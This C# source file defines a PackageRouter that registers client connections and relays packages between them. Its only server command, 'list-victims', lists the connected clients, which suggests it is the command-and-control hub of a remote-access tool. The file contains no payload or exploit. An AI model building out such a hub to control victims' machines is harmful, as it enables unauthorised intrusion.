using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using LinkUs.Core;

namespace LinkUs
{
    public class PackageRouter
    {
        private readonly IDictionary<ClientId, PackageConnector> _activeConnectors = new ConcurrentDictionary<ClientId, PackageConnector>();

        // ----- Public methods
        public void Add(IConnection connection)
        {
            var packageConnector = new PackageConnector(connection);
            var newClientId = ClientId.New();
            packageConnector.PackageReceived += PackageConnectorOnPackageReceived;
            _activeConnectors.Add(newClientId, packageConnector);
            Console.WriteLine($"* client '{newClientId}' connected.");
        }
        public void Remove(IConnection connection)
        {
            //packageConnector.PackageReceived -= PackageConnectorOnPackageReceived;
            //var entry = _activeConnectors.Single(x => Equals(x.Value, packageConnector));
            //_activeConnectors.Remove(entry.Key);
            throw new NotImplementedException();
        }
        public void Close()
        {
            foreach (var packageConnector in _activeConnectors.Values) {
                packageConnector.Close();
            }
        }

        // ----- Event callbacks
        private void PackageConnectorOnPackageReceived(object sender, Package package)
        {
            var packageConnector = (PackageConnector) sender;
            var clientId = _activeConnectors.Single(x => x.Value == packageConnector).Key;
            package.ChangeSource(clientId);
            ProcessPackage(package);
        }

        // ----- Internal logics
        private void SendPackage(Package package)
        {
            var packageConnector = _activeConnectors[package.Destination];
            packageConnector.Send(package);
        }
        private void ProcessPackage(Package package)
        {
            if (!Equals(package.Destination, ClientId.Server)) {
                SendPackage(package);
            }
            else {
                var commandLine = Encoding.UTF8.GetString(package.Content);
                if (commandLine == "list-victims") {
                    var clients = _activeConnectors.Keys;
                    var value = string.Join(Environment.NewLine, clients.Select(x => x.ToString()));
                    var packageResponse = package.CreateResponsePackage(Encoding.UTF8.GetBytes(value));
                    SendPackage(packageResponse);
                }
                else {
                    var responsePackage = package.CreateResponsePackage(Encoding.UTF8.GetBytes("Invalid command"));
                    SendPackage(responsePackage);
                }
            }
        }
    }
}